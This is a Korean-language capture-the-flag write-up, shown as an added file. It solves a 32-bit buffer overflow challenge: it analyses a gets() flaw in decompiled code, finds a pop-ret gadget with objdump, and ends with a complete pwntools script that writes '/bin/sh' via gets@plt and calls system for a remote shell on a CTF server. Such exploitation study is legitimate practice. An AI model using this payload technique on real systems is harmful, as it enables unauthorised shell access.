@@ -1,0 +1,136 @@
+풀이
+
+checksec 를 입력했을떄
+
+NX만 걸려있으므로 쉘코드사용이 불가능하다.
+다만 ( 그외의 기법들은 사용이 가능하다 )
+
+이제 IDA를 통해서 코드를 살펴보면
+
+
+main.c
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+0h] [ebp-84h]
+
+  alarm(0x3Cu);
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stderr, 0, 2, 0);
+  printf("Hey guyssssssssss here you are: %p %p\n", &binsh, &system);
+  fgets(&s, 128, stdin);
+  printf(&s);
+  gets(&s);
+  return 0;
+}
+
+인데 일단 우리에게 주어진 힌트는
+
+1. 버퍼( 문자열 s )
+2. binsh 와 system 주소		>> system 주소는 바뀜
+( binsh 주소는 비어있는주소 이다. 따라서 이주소에다가 bin/sh 주소를 넣고 진행하면된다 )
+3. gets(&s) 가 취약점
+
+
+###
+( 즉 gets 를 통해 문자열전달로 BOF 를 일으킬것이므로
+gadget 을 구하면된다. 즉 pr을 구하면됨 )
+
+gets 함수의 취약점을 이용해서 공격을 하려면 get의 plt 주소와 pr 주소를 알고있어야한다.
+
+ddugi@ubuntu:~/DOWN/Pro/pro2$ objdump -d gift | egrep 'pop|ret'
+80483ad: 5b pop %ebx
+80483ae: c3 ret
+8048432: 5e pop %esi
+8048466: c3 ret
+8048470: f3 c3 repz ret
+8048483: c3 ret
+80484b6: c3 ret
+80484c0: f3 c3 repz ret
+8048503: c3 ret
+8048508: f3 c3 repz ret
+804852c: c3 ret
+8048530: f3 c3 repz ret
+8048543: 5d pop %ebp
+8048608: c3 ret
+8048668: 5b pop %ebx
+8048669: 5e pop %esi
+804866a: 5f pop %edi
+804866b: 5d pop %ebp
+804866c: c3 ret
+8048670: f3 c3 repz ret
+8048686: 5b pop %ebx
+
+가나오는데 아래로 쪽내려보면 0x8048686 이있는데 솔직히말해서 pr 이기떄문에 pop ret 가 적혀있는 주소 아무거나 사용해도된다.
+
+그리고 info func 를 입력해서 gets@plt 주소를 구할수있다. 또는 IDA 통해서
+
+이러므로서 우리는 plt 주소와 pr 주소를 모두알았다.
+
+
+@@@@@@
+
+이제 본격적으로 시작해보자. 이문제는 비어있는 binsh 에 우리가 버퍼오버플로우를 일으켜서 문자열을 넣어서 실행시키면된다. 또한 ASLR을 확인하기위해
+
+1. ASLR(Address Space Layout Randomization) 설정 값 확인 및 변경
+
+ASLR(Address Space Layout Randomization) 설정 값을 확인합니다.
+
+ # cat /proc/sys/kernel/randomize_va_space
+
+
+
+randomize_va_space=0 //ASLR 해제
+
+randomize_va_space=1 //랜덤 스택 & 라이브러리 활성화
+
+randomize_va_space=2 //랜덤 스택 & 라이브러리 & 힙 활성화
+
+출처: https://lastcard.tistory.com/70 [月光愛靑狼]
+
+도 가능하다.
+
+따라서 주소를 고정하기위해 recv() 함수를 사용해야한다.
+
+get 함수에 넣어야하기위한 순서는?
+
+buf + get_plt 주소 + get_pr 주소 + binsh(빈곳) 주소 + system 주소 + [ ret(즉 아무문자열 a*4) + binsh(빈곳) 주소 ]
+
+이제 페이로드를 작성해보자.
+
+@@@@@@
+
+페이로드를 작성해보자.
+
+from pwn import *
+
+p = remote('ctf.j0n9hyun.xyz', 3018)
+
+get_plt = 0x80483d0		# plt 주소
+get_pr = 0x8048686		# pr 주소
+bin_sh = "/bin/sh\x00"	# binsh에 /bin/sh를 넣어서 읽어야하기떄문에 /bin/sh\x00 붙여줌 또한 읽어야하기때문에 따로 변수 설정함
+
+p.recvuntil('Hey guyssssssssss here you are: ')
+
+binsh = int(p.recv(10),16)		# binsh 고정
+system = int(p.recv(10),16)		# system 고정
+
+
+p.sendline('AAAA')			# Hey guyssssssssss here you are:  이부분 넘김
+
+payload = 'a'*136			# 버퍼가 0x84 이기때문에 132 + STP(4) = 136 
+payload += p32(get_plt)		# plt 		32패킹 필수
+payload += p32(get_pr)		# pr
+payload += p32(binsh)		# binsh
+payload += p32(system)		# system
+
+payload += 'A'*4			# ret 자리
+payload += p32(binsh)		# binsh
+
+
+
+p.sendline(payload)		# BOF일으키고 binsh에 삽입
+p.sendline(bin_sh)		# 삽입한 문자열 읽기
+
+p.interactive()
